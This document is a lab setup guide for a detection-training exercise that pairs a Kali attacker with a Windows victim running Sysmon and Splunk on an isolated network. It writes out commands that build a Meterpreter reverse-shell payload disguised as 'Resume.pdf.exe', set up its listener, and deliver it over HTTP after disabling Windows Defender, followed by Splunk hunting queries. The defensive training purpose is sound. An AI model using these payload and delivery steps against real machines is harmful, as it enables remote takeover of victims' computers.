***Lab Setup Guide***

Network Topology

Primary Network: NAT (internet access for downloads)
Internal Network: 192.168.20.0/24 (isolated attack simulation)
Victim Machine: 192.168.20.10 (Windows 10)
Attacker Machine: 192.168.20.11 (Kali Linux)
SIEM: Splunk Enterprise (installed on Windows victim)

📋 Prerequisites

Hardware: 12GB RAM minimum, 80GB free disk space
Hypervisor: VirtualBox 6.0+
Network: Dual adapter setup (NAT + Internal)

🖥️ Virtual Machine Setup
1. Windows 10 Victim Machine
bash# VM Specifications
CPU: 2 cores
RAM: 6GB
Disk: 60GB
Network Adapter 1: NAT (internet access)
Network Adapter 2: Internal Network "intnet" (192.168.20.0/24)
Configuration Steps:

Install Windows 10 Enterprise/Pro
Network Setup:

Adapter 1: DHCP (automatic for internet)
Adapter 2: Static IP 192.168.20.10, Subnet 255.255.255.0


Security Configuration:

Disable Windows Defender Real-time Protection (lab only!)
Enable RDP: Settings > System > Remote Desktop


Splunk Enterprise Installation:

Download Splunk Enterprise (free license)
Install with default settings
Access via http://localhost:8000



2. Kali Linux Attacker Machine
bash# VM Specifications  
CPU: 2 cores
RAM: 4GB
Disk: 40GB
Network Adapter 1: NAT (internet access)
Network Adapter 2: Internal Network "intnet" (192.168.20.0/24)
Configuration Steps:

Install Kali Linux 2023.4+
Network Setup:

Adapter 1: DHCP (automatic for internet)
Adapter 2: Static IP 192.168.20.11, Subnet 255.255.255.0


Tool Verification:
bash# Verify essential tools are available
which msfvenom
which msfconsole
which nmap
which python3


🔧 Software Installation
Sysmon Configuration (Windows Victim)

Download Sysmon from Microsoft Sysinternals
Download Olaf Configuration:
powershell# Download from GitHub
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/olafhartong/sysmon-modular/master/sysmonconfig.xml" -OutFile "sysmonconfig.xml"

Install Sysmon:
powershell# Run as Administrator
.\sysmon64.exe -accepteula -i sysmonconfig.xml

Verify Installation:
powershellGet-Service Sysmon64
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Select-Object -First 5


Splunk Configuration (Windows Victim)

Create Endpoint Index:

Go to Settings > Indexes > New Index
Index Name: endpoint
Save


Configure Data Inputs:

Go to Settings > Data Inputs > Windows Event Logs
Add: Microsoft-Windows-Sysmon/Operational
Index: endpoint


Manual inputs.conf Configuration (Alternative):
ini# Edit: $SPLUNK_HOME\etc\system\local\inputs.conf
[WinEventLog://Microsoft-Windows-Sysmon/Operational]
disabled = false
index = endpoint
sourcetype = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational


🎯 Attack Simulation Workflow
1. Network Reconnaissance (Kali Linux)
bash# Verify internal network connectivity
ping 192.168.20.10

# Perform detailed nmap scan
nmap -A 192.168.20.10 -Pn
# Expected result: Port 3389 (RDP) should be open
2. Payload Creation (Kali Linux)
bash# List available payloads (optional)
msfvenom -l payloads | grep windows

# Create reverse shell payload
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.20.11 lport=4444 -f exe -o Resume.pdf.exe
3. Listener Setup (Kali Linux)
bash# Start Metasploit console
msfconsole

# Configure handler
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.20.11
set lport 4444
exploit

# Keep this terminal open and listening
4. Payload Delivery Setup (Kali Linux - New Terminal)
bash# Start HTTP server for payload delivery
python3 -m http.server 9999

# Payload will be available at: http://192.168.20.11:9999/Resume.pdf.exe
5. Payload Execution (Windows Victim)

Disable Windows Defender (Real-time Protection)
Open Firefox/Chrome and navigate to: 192.168.20.11:9999
Download Resume.pdf.exe and execute it
Verify connection in Metasploit terminal (should show meterpreter session)

🚀 Validation Steps
1. Network Connectivity Test
bash# From Kali Linux
ping 192.168.20.10  # Should reach Windows victim
curl http://192.168.20.10  # Should fail (no web server)

# From Windows
ping 192.168.20.11  # Should reach Kali attacker
2. Splunk Data Ingestion Test
splunk# Search for initial Sysmon events
index=endpoint source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
| head 10

# Search for malware execution (after attack)
index=endpoint "Resume.pdf.exe"
3. SOC Analysis Validation
splunk# Get process GUID from initial search
index=endpoint "Resume.pdf.exe" | head 1

# Use the ProcessGuid for detailed analysis
index=endpoint "<ProcessGuid-from-above>"
| table _time,ParentImage,Image,CommandLine

# Expected results: Should show cmd.exe processes with net user, net localgroup, ipconfig
4. Threat Hunting Query Test
splunk# PDF masquerading detection
index=endpoint EventCode=1 
| where match(Image, "\\.pdf\\.exe$")
| table _time, Computer, Image, CommandLine

# Should return the Resume.pdf.exe execution
⚠️ Security Considerations
⚠️ CRITICAL: This lab contains live malware and attack techniques

Isolated Environment Only: Never connect to production networks
Windows Defender Disabled: Restore real-time protection after testing
Snapshots Recommended: Take VM snapshots before malware execution
Network Isolation: Internal network prevents external communication
Controlled Malware: Resume.pdf.exe is a test payload, not real malware

🔧 Troubleshooting
Common Issues:

Meterpreter won't connect: Check firewall settings and IP addresses
No Sysmon logs in Splunk: Restart Splunk service and verify inputs.conf
Network connectivity issues: Verify both VMs have internal network adapter enabled
HTTP server not accessible: Check Python HTTP server is running on port 9999

Quick Fixes:
bash# Restart Splunk (Windows)
net stop splunkd
net start splunkd

# Verify internal network (both VMs)
ipconfig /all  # Windows
ip addr show   # Linux
